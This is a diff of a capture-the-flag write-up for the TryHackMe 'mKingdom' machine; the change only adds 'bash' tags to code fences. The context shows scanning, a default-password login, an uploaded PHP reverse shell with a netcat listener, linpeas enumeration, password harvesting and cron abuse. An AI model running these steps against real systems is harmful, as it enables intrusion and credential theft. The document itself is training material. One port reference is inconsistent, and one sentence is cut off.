@@ -18,7 +18,7 @@ This first step should be very obvious when you start. Start the machine and Nma
 
 I always start by scanning all ports to avoid missing any services running on uncommon ports:
 
-```
+```bash
 nmap -sS -p 1-65535 10.10.226.51
 ```
 
@@ -28,7 +28,7 @@ We see only an HTTP server running on port 85, which is not the standard port 80
 
 If your machine returns an open port, you can still gather more information about this webserver with the following command:
 
-```
+```bash
 nmap -sC -sV -Pn 10.10.226.51 -p 85
 ```
 
@@ -41,13 +41,13 @@ ___
 # Webserver Enumeration
 I always add the server IP to my ```/etc/hosts``` file and I recomment you doing the same:
 
-```
+```bash
 sudo nano /etc/hosts
 ```
 
 And add this line to your hosts (change the IP to your target machine address!)
 
-```
+```bash
 10.10.226.51    mkingdom.thm
 ```
 
@@ -69,13 +69,13 @@ ___
 
 We run Gobuster to find any directories. I like to start with a small wordlist first, and if it comes up empty, I do an extension search:
 
-```
+```bash
 gobuster dir -u http://mkingdom.thm:85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 ```
 
 We find one directory immediately. If you let the full scan run, it doesn't show anything else. 
 
-```
+```bash
 /app                  (Status: 301) [Size: 312] [--> http://mkingdom.thm:85/app/]
 ```
 
@@ -155,7 +155,7 @@ ___
 
 But then I remembered that this box is labeled as easy, and people in the Discord were getting past it with very little effort. I had to think less hard and fall back on the most basic form of login. I tried the most default of default credentials.
 
-```
+```bash
 admin admin.... WRONG!
 admin pa____rd.... CORRECT! (can you guess the full password?)
 ```
@@ -166,7 +166,7 @@ I hit my wall out of frustration and went on to upload my PHP shell.
 
 Because the webserver is the only service running on the machine, the PHP shell will be my only way to control the machine. I generated a [PHP Pentestmonkey reverse shell](https://www.revshells.com/), saved it and looked again at [the guide from earlier](https://vulners.com/hackerone/H1:768322). It's not that hard to do. Just follow the guide, and you will have your shell up in no time (don't forget to whitelist the php extention under ```System & Setting > Files > Allowed File Types```). When uploading the file, click on close when the bar under the uploaded shell turns green. Start a netcat listener and click the link after you uploaded your shell.
 
-```
+```bash
 ncat -lvnp 8888 (or any other Lport you want to use. Make sure it is the same as in your php shell script!)
 ```
 
@@ -176,14 +176,14 @@ ___
 
 Now that we have access, we need to stabilize the shell. In your Netcat listener, copy and paste the following lines:
 
-```
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
 Next, hit 'Ctrl + Z' to put the Netcat listener in the background (don't worry, it is still running, but you need to paste the following command in your own terminal on the same window that Netcat is running):
 
-```
+```bash
 stty raw -echo; fg
 ```
 
@@ -213,7 +213,7 @@ I ran [```linpeas.sh```](https://github.com/peass-ng/PEASS-ng/tree/master/linPEA
 
 On attacker machine:
 
-```
+```bash
 cp linpeas.sh linpeas.txt
 ```
 
@@ -227,7 +227,7 @@ mv linpeas.txt linpeas.sh
 
 This will take a minute. Wait, then download the ```peas.txt``` file on the attacker machine:
 
-```
+```bash
 wget http://mkingdom.thm:85/app/castle/application/files/path/to/peas.txt
 ```
 
@@ -239,7 +239,7 @@ Linpeas generates a big file with a lot of information. Use ```cat``` to display
  <summary>Need a hint?</summary>
  One output is marked in yellow and should be easy to find. The other one is very valuable. You can try the following command for a more focused search:
  
- ```
+ ```bash
  cat peas.txt | grep password -n
  ```
  
@@ -302,7 +302,7 @@ drwxr-xr-x  2 toad toad 4096 Nov 26  2023 Videos
 
 Hmm... no userflag here. But we do have an ```smb.txt``` file. There doesn't seem to be an SMB server running on this system, but maybe we need to find another system?
 
-```
+```bash
 cat smb.txt
 ```
 
@@ -375,7 +375,7 @@ aWthVGVOVEFOdEVTCg==
 
 Yup, it is the same. The two ```==``` symbols indicate this string of letters is encoded in ```base64```. ```Base64``` takes three characters and encodes them into four characters. When a string is not a multiple of three, it uses the ```=``` character at the end as padding to fill up leftover bytes. This way the message can be correctly decoded. Let's decode it now.
 
-```
+```bash
 toad@mkingdom:~$ echo $PWD_token | base64 --decode
 ```
 
@@ -571,7 +571,7 @@ Change the IP address to your own IP address on the TryHackMe vpn. Leave one tab
 
 Hit ```Ctrl+X```, ```Y``` and ```Enter```. This will save the file. Restart they python webserver on port 85 on your attacker machine. We need to listen on this port, because the cron
 
-```
+```bash
 python3 -m http.server 5555
 ```
 
